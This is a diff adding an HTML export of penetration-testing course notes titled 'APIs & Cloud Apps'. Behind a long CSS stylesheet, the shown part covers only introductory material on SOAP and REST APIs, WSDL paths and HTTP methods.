@@ -1,0 +1,792 @@
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"/><title>APIs &amp; Cloud Apps</title><style>
+/* cspell:disable-file */
+/* webkit printing magic: print all background colors */
+html {
+	-webkit-print-color-adjust: exact;
+}
+* {
+	box-sizing: border-box;
+	-webkit-print-color-adjust: exact;
+}
+
+html,
+body {
+	margin: 0;
+	padding: 0;
+}
+@media only screen {
+	body {
+		margin: 2em auto;
+		max-width: 900px;
+		color: rgb(55, 53, 47);
+	}
+}
+
+body {
+	line-height: 1.5;
+	white-space: pre-wrap;
+}
+
+a,
+a.visited {
+	color: inherit;
+	text-decoration: underline;
+}
+
+.pdf-relative-link-path {
+	font-size: 80%;
+	color: #444;
+}
+
+h1,
+h2,
+h3 {
+	letter-spacing: -0.01em;
+	line-height: 1.2;
+	font-weight: 600;
+	margin-bottom: 0;
+}
+
+.page-title {
+	font-size: 2.5rem;
+	font-weight: 700;
+	margin-top: 0;
+	margin-bottom: 0.75em;
+}
+
+h1 {
+	font-size: 1.875rem;
+	margin-top: 1.875rem;
+}
+
+h2 {
+	font-size: 1.5rem;
+	margin-top: 1.5rem;
+}
+
+h3 {
+	font-size: 1.25rem;
+	margin-top: 1.25rem;
+}
+
+.source {
+	border: 1px solid #ddd;
+	border-radius: 3px;
+	padding: 1.5em;
+	word-break: break-all;
+}
+
+.callout {
+	border-radius: 3px;
+	padding: 1rem;
+}
+
+figure {
+	margin: 1.25em 0;
+	page-break-inside: avoid;
+}
+
+figcaption {
+	opacity: 0.5;
+	font-size: 85%;
+	margin-top: 0.5em;
+}
+
+mark {
+	background-color: transparent;
+}
+
+.indented {
+	padding-left: 1.5em;
+}
+
+hr {
+	background: transparent;
+	display: block;
+	width: 100%;
+	height: 1px;
+	visibility: visible;
+	border: none;
+	border-bottom: 1px solid rgba(55, 53, 47, 0.09);
+}
+
+img {
+	max-width: 100%;
+}
+
+@media only print {
+	img {
+		max-height: 100vh;
+		object-fit: contain;
+	}
+}
+
+@page {
+	margin: 1in;
+}
+
+.collection-content {
+	font-size: 0.875rem;
+}
+
+.column-list {
+	display: flex;
+	justify-content: space-between;
+}
+
+.column {
+	padding: 0 1em;
+}
+
+.column:first-child {
+	padding-left: 0;
+}
+
+.column:last-child {
+	padding-right: 0;
+}
+
+.table_of_contents-item {
+	display: block;
+	font-size: 0.875rem;
+	line-height: 1.3;
+	padding: 0.125rem;
+}
+
+.table_of_contents-indent-1 {
+	margin-left: 1.5rem;
+}
+
+.table_of_contents-indent-2 {
+	margin-left: 3rem;
+}
+
+.table_of_contents-indent-3 {
+	margin-left: 4.5rem;
+}
+
+.table_of_contents-link {
+	text-decoration: none;
+	opacity: 0.7;
+	border-bottom: 1px solid rgba(55, 53, 47, 0.18);
+}
+
+table,
+th,
+td {
+	border: 1px solid rgba(55, 53, 47, 0.09);
+	border-collapse: collapse;
+}
+
+table {
+	border-left: none;
+	border-right: none;
+}
+
+th,
+td {
+	font-weight: normal;
+	padding: 0.25em 0.5em;
+	line-height: 1.5;
+	min-height: 1.5em;
+	text-align: left;
+}
+
+th {
+	color: rgba(55, 53, 47, 0.6);
+}
+
+ol,
+ul {
+	margin: 0;
+	margin-block-start: 0.6em;
+	margin-block-end: 0.6em;
+}
+
+li > ol:first-child,
+li > ul:first-child {
+	margin-block-start: 0.6em;
+}
+
+ul > li {
+	list-style: disc;
+}
+
+ul.to-do-list {
+	padding-inline-start: 0;
+}
+
+ul.to-do-list > li {
+	list-style: none;
+}
+
+.to-do-children-checked {
+	text-decoration: line-through;
+	opacity: 0.375;
+}
+
+ul.toggle > li {
+	list-style: none;
+}
+
+ul {
+	padding-inline-start: 1.7em;
+}
+
+ul > li {
+	padding-left: 0.1em;
+}
+
+ol {
+	padding-inline-start: 1.6em;
+}
+
+ol > li {
+	padding-left: 0.2em;
+}
+
+.mono ol {
+	padding-inline-start: 2em;
+}
+
+.mono ol > li {
+	text-indent: -0.4em;
+}
+
+.toggle {
+	padding-inline-start: 0em;
+	list-style-type: none;
+}
+
+/* Indent toggle children */
+.toggle > li > details {
+	padding-left: 1.7em;
+}
+
+.toggle > li > details > summary {
+	margin-left: -1.1em;
+}
+
+.selected-value {
+	display: inline-block;
+	padding: 0 0.5em;
+	background: rgba(206, 205, 202, 0.5);
+	border-radius: 3px;
+	margin-right: 0.5em;
+	margin-top: 0.3em;
+	margin-bottom: 0.3em;
+	white-space: nowrap;
+}
+
+.collection-title {
+	display: inline-block;
+	margin-right: 1em;
+}
+
+.page-description {
+    margin-bottom: 2em;
+}
+
+.simple-table {
+	margin-top: 1em;
+	font-size: 0.875rem;
+	empty-cells: show;
+}
+.simple-table td {
+	height: 29px;
+	min-width: 120px;
+}
+
+.simple-table th {
+	height: 29px;
+	min-width: 120px;
+}
+
+.simple-table-header-color {
+	background: rgb(247, 246, 243);
+	color: black;
+}
+.simple-table-header {
+	font-weight: 500;
+}
+
+time {
+	opacity: 0.5;
+}
+
+.icon {
+	display: inline-block;
+	max-width: 1.2em;
+	max-height: 1.2em;
+	text-decoration: none;
+	vertical-align: text-bottom;
+	margin-right: 0.5em;
+}
+
+img.icon {
+	border-radius: 3px;
+}
+
+.user-icon {
+	width: 1.5em;
+	height: 1.5em;
+	border-radius: 100%;
+	margin-right: 0.5rem;
+}
+
+.user-icon-inner {
+	font-size: 0.8em;
+}
+
+.text-icon {
+	border: 1px solid #000;
+	text-align: center;
+}
+
+.page-cover-image {
+	display: block;
+	object-fit: cover;
+	width: 100%;
+	max-height: 30vh;
+}
+
+.page-header-icon {
+	font-size: 3rem;
+	margin-bottom: 1rem;
+}
+
+.page-header-icon-with-cover {
+	margin-top: -0.72em;
+	margin-left: 0.07em;
+}
+
+.page-header-icon img {
+	border-radius: 3px;
+}
+
+.link-to-page {
+	margin: 1em 0;
+	padding: 0;
+	border: none;
+	font-weight: 500;
+}
+
+p > .user {
+	opacity: 0.5;
+}
+
+td > .user,
+td > time {
+	white-space: nowrap;
+}
+
+input[type="checkbox"] {
+	transform: scale(1.5);
+	margin-right: 0.6em;
+	vertical-align: middle;
+}
+
+p {
+	margin-top: 0.5em;
+	margin-bottom: 0.5em;
+}
+
+.image {
+	border: none;
+	margin: 1.5em 0;
+	padding: 0;
+	border-radius: 0;
+	text-align: center;
+}
+
+.code,
+code {
+	background: rgba(135, 131, 120, 0.15);
+	border-radius: 3px;
+	padding: 0.2em 0.4em;
+	border-radius: 3px;
+	font-size: 85%;
+	tab-size: 2;
+}
+
+code {
+	color: #eb5757;
+}
+
+.code {
+	padding: 1.5em 1em;
+}
+
+.code-wrap {
+	white-space: pre-wrap;
+	word-break: break-all;
+}
+
+.code > code {
+	background: none;
+	padding: 0;
+	font-size: 100%;
+	color: inherit;
+}
+
+blockquote {
+	font-size: 1.25em;
+	margin: 1em 0;
+	padding-left: 1em;
+	border-left: 3px solid rgb(55, 53, 47);
+}
+
+.bookmark {
+	text-decoration: none;
+	max-height: 8em;
+	padding: 0;
+	display: flex;
+	width: 100%;
+	align-items: stretch;
+}
+
+.bookmark-title {
+	font-size: 0.85em;
+	overflow: hidden;
+	text-overflow: ellipsis;
+	height: 1.75em;
+	white-space: nowrap;
+}
+
+.bookmark-text {
+	display: flex;
+	flex-direction: column;
+}
+
+.bookmark-info {
+	flex: 4 1 180px;
+	padding: 12px 14px 14px;
+	display: flex;
+	flex-direction: column;
+	justify-content: space-between;
+}
+
+.bookmark-image {
+	width: 33%;
+	flex: 1 1 180px;
+	display: block;
+	position: relative;
+	object-fit: cover;
+	border-radius: 1px;
+}
+
+.bookmark-description {
+	color: rgba(55, 53, 47, 0.6);
+	font-size: 0.75em;
+	overflow: hidden;
+	max-height: 4.5em;
+	word-break: break-word;
+}
+
+.bookmark-href {
+	font-size: 0.75em;
+	margin-top: 0.25em;
+}
+
+.sans { font-family: ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol"; }
+.code { font-family: "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace; }
+.serif { font-family: Lyon-Text, Georgia, ui-serif, serif; }
+.mono { font-family: iawriter-mono, Nitti, Menlo, Courier, monospace; }
+.pdf .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK JP'; }
+.pdf:lang(zh-CN) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK SC'; }
+.pdf:lang(zh-TW) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK TC'; }
+.pdf:lang(ko-KR) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK KR'; }
+.pdf .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
+.pdf:lang(zh-CN) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
+.pdf:lang(zh-TW) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
+.pdf:lang(ko-KR) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
+.pdf .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK JP'; }
+.pdf:lang(zh-CN) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK SC'; }
+.pdf:lang(zh-TW) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK TC'; }
+.pdf:lang(ko-KR) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK KR'; }
+.pdf .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
+.pdf:lang(zh-CN) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
+.pdf:lang(zh-TW) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
+.pdf:lang(ko-KR) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
+.highlight-default {
+	color: rgba(55, 53, 47, 1);
+}
+.highlight-gray {
+	color: rgba(120, 119, 116, 1);
+	fill: rgba(120, 119, 116, 1);
+}
+.highlight-brown {
+	color: rgba(159, 107, 83, 1);
+	fill: rgba(159, 107, 83, 1);
+}
+.highlight-orange {
+	color: rgba(217, 115, 13, 1);
+	fill: rgba(217, 115, 13, 1);
+}
+.highlight-yellow {
+	color: rgba(203, 145, 47, 1);
+	fill: rgba(203, 145, 47, 1);
+}
+.highlight-teal {
+	color: rgba(68, 131, 97, 1);
+	fill: rgba(68, 131, 97, 1);
+}
+.highlight-blue {
+	color: rgba(51, 126, 169, 1);
+	fill: rgba(51, 126, 169, 1);
+}
+.highlight-purple {
+	color: rgba(144, 101, 176, 1);
+	fill: rgba(144, 101, 176, 1);
+}
+.highlight-pink {
+	color: rgba(193, 76, 138, 1);
+	fill: rgba(193, 76, 138, 1);
+}
+.highlight-red {
+	color: rgba(212, 76, 71, 1);
+	fill: rgba(212, 76, 71, 1);
+}
+.highlight-gray_background {
+	background: rgba(241, 241, 239, 1);
+}
+.highlight-brown_background {
+	background: rgba(244, 238, 238, 1);
+}
+.highlight-orange_background {
+	background: rgba(251, 236, 221, 1);
+}
+.highlight-yellow_background {
+	background: rgba(251, 243, 219, 1);
+}
+.highlight-teal_background {
+	background: rgba(237, 243, 236, 1);
+}
+.highlight-blue_background {
+	background: rgba(231, 243, 248, 1);
+}
+.highlight-purple_background {
+	background: rgba(244, 240, 247, 0.8);
+}
+.highlight-pink_background {
+	background: rgba(249, 238, 243, 0.8);
+}
+.highlight-red_background {
+	background: rgba(253, 235, 236, 1);
+}
+.block-color-default {
+	color: inherit;
+	fill: inherit;
+}
+.block-color-gray {
+	color: rgba(120, 119, 116, 1);
+	fill: rgba(120, 119, 116, 1);
+}
+.block-color-brown {
+	color: rgba(159, 107, 83, 1);
+	fill: rgba(159, 107, 83, 1);
+}
+.block-color-orange {
+	color: rgba(217, 115, 13, 1);
+	fill: rgba(217, 115, 13, 1);
+}
+.block-color-yellow {
+	color: rgba(203, 145, 47, 1);
+	fill: rgba(203, 145, 47, 1);
+}
+.block-color-teal {
+	color: rgba(68, 131, 97, 1);
+	fill: rgba(68, 131, 97, 1);
+}
+.block-color-blue {
+	color: rgba(51, 126, 169, 1);
+	fill: rgba(51, 126, 169, 1);
+}
+.block-color-purple {
+	color: rgba(144, 101, 176, 1);
+	fill: rgba(144, 101, 176, 1);
+}
+.block-color-pink {
+	color: rgba(193, 76, 138, 1);
+	fill: rgba(193, 76, 138, 1);
+}
+.block-color-red {
+	color: rgba(212, 76, 71, 1);
+	fill: rgba(212, 76, 71, 1);
+}
+.block-color-gray_background {
+	background: rgba(241, 241, 239, 1);
+}
+.block-color-brown_background {
+	background: rgba(244, 238, 238, 1);
+}
+.block-color-orange_background {
+	background: rgba(251, 236, 221, 1);
+}
+.block-color-yellow_background {
+	background: rgba(251, 243, 219, 1);
+}
+.block-color-teal_background {
+	background: rgba(237, 243, 236, 1);
+}
+.block-color-blue_background {
+	background: rgba(231, 243, 248, 1);
+}
+.block-color-purple_background {
+	background: rgba(244, 240, 247, 0.8);
+}
+.block-color-pink_background {
+	background: rgba(249, 238, 243, 0.8);
+}
+.block-color-red_background {
+	background: rgba(253, 235, 236, 1);
+}
+.select-value-color-uiBlue { background-color: rgba(35, 131, 226, .07); }
+.select-value-color-pink { background-color: rgba(245, 224, 233, 1); }
+.select-value-color-purple { background-color: rgba(232, 222, 238, 1); }
+.select-value-color-green { background-color: rgba(219, 237, 219, 1); }
+.select-value-color-gray { background-color: rgba(227, 226, 224, 1); }
+.select-value-color-transparentGray { background-color: rgba(227, 226, 224, 0); }
+.select-value-color-translucentGray { background-color: rgba(0, 0, 0, 0.06); }
+.select-value-color-orange { background-color: rgba(250, 222, 201, 1); }
+.select-value-color-brown { background-color: rgba(238, 224, 218, 1); }
+.select-value-color-red { background-color: rgba(255, 226, 221, 1); }
+.select-value-color-yellow { background-color: rgba(253, 236, 200, 1); }
+.select-value-color-blue { background-color: rgba(211, 229, 239, 1); }
+.select-value-color-pageGlass { background-color: undefined; }
+.select-value-color-washGlass { background-color: undefined; }
+
+.checkbox {
+	display: inline-flex;
+	vertical-align: text-bottom;
+	width: 16;
+	height: 16;
+	background-size: 16px;
+	margin-left: 2px;
+	margin-right: 5px;
+}
+
+.checkbox-on {
+	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20width%3D%2216%22%20height%3D%2216%22%20fill%3D%22%2358A9D7%22%2F%3E%0A%3Cpath%20d%3D%22M6.71429%2012.2852L14%204.9995L12.7143%203.71436L6.71429%209.71378L3.28571%206.2831L2%207.57092L6.71429%2012.2852Z%22%20fill%3D%22white%22%2F%3E%0A%3C%2Fsvg%3E");
+}
+
+.checkbox-off {
+	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20x%3D%220.75%22%20y%3D%220.75%22%20width%3D%2214.5%22%20height%3D%2214.5%22%20fill%3D%22white%22%20stroke%3D%22%2336352F%22%20stroke-width%3D%221.5%22%2F%3E%0A%3C%2Fsvg%3E");
+}
+	
+</style></head><body><article id="c7a5d503-72d9-4eb6-9d24-0f5710d777d0" class="page mono"><header><h1 class="page-title"><strong>APIs &amp; Cloud Apps</strong></h1><p class="page-description"></p><table class="properties"><tbody><tr class="property-row property-row-multi_select"><th><span class="icon property-icon"><svg role="graphics-symbol" viewBox="0 0 16 16" style="width:14px;height:14px;display:block;fill:rgba(55, 53, 47, 0.45);flex-shrink:0" class="typesMultipleSelect"><path d="M1.91602 4.83789C2.44238 4.83789 2.87305 4.40723 2.87305 3.87402C2.87305 3.34766 2.44238 2.91699 1.91602 2.91699C1.38281 2.91699 0.952148 3.34766 0.952148 3.87402C0.952148 4.40723 1.38281 4.83789 1.91602 4.83789ZM5.1084 4.52344H14.3984C14.7607 4.52344 15.0479 4.23633 15.0479 3.87402C15.0479 3.51172 14.7607 3.22461 14.3984 3.22461H5.1084C4.74609 3.22461 4.45898 3.51172 4.45898 3.87402C4.45898 4.23633 4.74609 4.52344 5.1084 4.52344ZM1.91602 9.03516C2.44238 9.03516 2.87305 8.60449 2.87305 8.07129C2.87305 7.54492 2.44238 7.11426 1.91602 7.11426C1.38281 7.11426 0.952148 7.54492 0.952148 8.07129C0.952148 8.60449 1.38281 9.03516 1.91602 9.03516ZM5.1084 8.7207H14.3984C14.7607 8.7207 15.0479 8.43359 15.0479 8.07129C15.0479 7.70898 14.7607 7.42188 14.3984 7.42188H5.1084C4.74609 7.42188 4.45898 7.70898 4.45898 8.07129C4.45898 8.43359 4.74609 8.7207 5.1084 8.7207ZM1.91602 13.2324C2.44238 13.2324 2.87305 12.8018 2.87305 12.2686C2.87305 11.7422 2.44238 11.3115 1.91602 11.3115C1.38281 11.3115 0.952148 11.7422 0.952148 12.2686C0.952148 12.8018 1.38281 13.2324 1.91602 13.2324ZM5.1084 12.918H14.3984C14.7607 12.918 15.0479 12.6309 15.0479 12.2686C15.0479 11.9062 14.7607 11.6191 14.3984 11.6191H5.1084C4.74609 11.6191 4.45898 11.9062 4.45898 12.2686C4.45898 12.6309 4.74609 12.918 5.1084 12.918Z"></path></svg></span>Tags</th><td><span class="selected-value select-value-color-red">eWPTX v2 INE</span></td></tr></tbody></table></header><div class="page-body"><h1 id="18c36ee4-4a71-4a16-852c-ff90195e98ac" class=""><strong>APIs &amp; Cloud Apps</strong><strong><a href="https://johnermac.github.io/notes/ewptx/apiscloud/#apis--cloud-apps"></a></strong></h1><ul id="9c6d933b-fbd0-46c7-b7d3-c3a0472b5701" class="bulleted-list"><li style="list-style-type:disc">Introduction to APIs</li></ul><ul id="b2d62efe-8c4f-493e-b4e7-3f8f11ab3504" class="bulleted-list"><li style="list-style-type:disc">API Testing &amp; Attacking</li></ul><ul id="496b8d40-e0c3-4552-a0eb-971cd4b3510e" class="bulleted-list"><li style="list-style-type:disc">API Access Control</li></ul><ul id="a54fe274-856d-45f1-91ea-b88a7715fdb5" class="bulleted-list"><li style="list-style-type:disc">Resource Sharing</li></ul><ul id="47b43d80-abfb-4096-b5f6-e0d8d19cd224" class="bulleted-list"><li style="list-style-type:disc">Attacking Cloud Based Applications</li></ul><p id="ff1929c8-5d9f-4a13-9eca-2f8ec4c1c013" class="">Objetives:</p><ul id="3d28f501-f0b5-4f5d-b28b-abbf8c4a6835" class="bulleted-list"><li style="list-style-type:disc">Attacking API based applications</li></ul><ul id="d7fe0a9f-40ff-4d46-9e7a-cbbf6283003b" class="bulleted-list"><li style="list-style-type:disc">Common vulnerabilities found in Cloud environments</li></ul><h2 id="9cff94ae-bf1e-4390-8ac2-4da1c78a7692" class=""><strong>Introduction to APIs</strong><strong><a href="https://johnermac.github.io/notes/ewptx/apiscloud/#introduction-to-apis"></a></strong></h2><p id="cb6385de-e37b-4bfc-8e35-f30af82600fd" class="">API = Application Programming Interface</p><ul id="0c69b31d-6ea1-4d7d-87a9-66ddbe442fd4" class="bulleted-list"><li style="list-style-type:disc">Its a non-GUI collection of endpoints in a standardized form so it can be used by human user as well as a machine. Its often accompanied by documentation that can be in both a machine and a human-readable form</li></ul><p id="3fb9d5ba-7edf-466e-bd6a-f1a96bcbe596" class="">There are lots of APIs, For example:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="fe0f4d0f-5156-49b9-8e3c-607cb9f1fac0" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">- Windows API
+- Remote APIs (RPC  - remote procedure call)
+- Web APIs
+# Web services (SOAP/XML)
+# REST APIs (JSON)
+</code></pre><p id="de9686bb-8f2a-426e-8559-f15cd1caf236" class="">APIs differs from a website because:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="260f6c46-5cd6-4167-af44-8103daf6dc5d" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">- It has a standardized input/output form so that it can be scripted
+- Its language independent (it should work on each platform in the same way)
+- It aims to be secure (e.g. it allows only some predefined methods)
+</code></pre><p id="b10ab33f-0c71-4713-b83a-b1e80f5720a3" class="">SOAP APIs utilizes the Simple Object Access Protocol to define communication standard - so how the request and response looks, as well as the parameters can be passed in them.</p><p id="3c24a8d0-6975-4414-b06c-d3eebc3338ae" class="">SOAP Messages (HTTP Requests) are an XML type and must contain some special elements</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="aa849141-0a2c-4f02-ac02-8d5d9d63b9b8" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">- Content type text/xml is also allowed
+- SOAPAction is sometimes used just For the standard and sometimes needs to hold the called method name
+</code></pre><figure id="7f8c8178-5c76-469f-a457-d7c7efd0acc8" class="image"><a href="https://johnermac.github.io/assets/images/posts/ewptx/101.png"><img src="https://johnermac.github.io/assets/images/posts/ewptx/101.png"/></a></figure><figure id="74be9e6e-7981-4369-aba8-62308c435cde" class="image"><a href="https://johnermac.github.io/assets/images/posts/ewptx/102.png"><img src="https://johnermac.github.io/assets/images/posts/ewptx/102.png"/></a></figure><p id="03d3b73d-9050-44cf-8b00-f24fe5509fdc" class="">API Contains both human and machine-readable documentation. For SOAP-based APIs, the documentation is stored in WSDL files. Usually, these files are stored under the <strong>?wsdl</strong> path</p><p id="cd12d79c-b6d5-4628-b8b2-6b5b19a7a0c6" class="">→ https://api.example.com/api/?wsdl</p><p id="390319e8-77d5-4fd5-a503-4206262a9f9b" class="">Take a look at an examplary calculator service online:</p><p id="0ad2b354-a811-4800-b7d8-7c335e11234f" class="">→ http://www.dneonline.com/calculator.asmx</p><p id="b6e74437-6078-4e60-a323-98d2a68531b3" class="">At the following address:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="131d85e8-2757-4af6-ab59-ecc5b7993dcf" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">→ http://www.dneonline.com/calculator.asmx?op=Add
+# u can see an examplary SOAP request that was issued in order to speak to the calculator service
+
+→ http://www.dneonline.com/calculator.asmx?wsdl
+# to see the full WSDL
+</code></pre><p id="987bb8b9-1429-42ad-975a-b3833282ac40" class="">This kind of interface, equipped with documentation that can be parsed by a machine, allows us to expose a large number of methods where each of them has its own purpose.</p><ul id="fb84f3cc-8758-49e8-8b1e-a682a0a6b9fb" class="bulleted-list"><li style="list-style-type:disc">Another type of API is REST (Representation State Transfer) APIs.</li></ul><p id="c5e4a567-c059-4ef8-ae65-b9454880dea9" class="">Usually, the method client is about to call is in the resource path:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="a9f86dfd-848e-4a03-90c9-f0c89ffde8fe" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">GET /api/v2/methodName
+</code></pre><ul id="aca622f5-9d73-4158-9d48-a904695eb616" class="bulleted-list"><li style="list-style-type:disc">Depending on the request type, the parameters might be passed differently</li></ul><p id="81e62297-3db0-430c-82f4-e4509a7fe47f" class="">In REST APIs, HTTP methods have some special meaning:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="186fd9a2-263a-46df-aa9d-3abc3ec45a92" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">GET    - Read   resource
+POST   - Create resource
+PUT    - Update resource
+DELETE - Delete resource
+PATCH  - Update resource partially
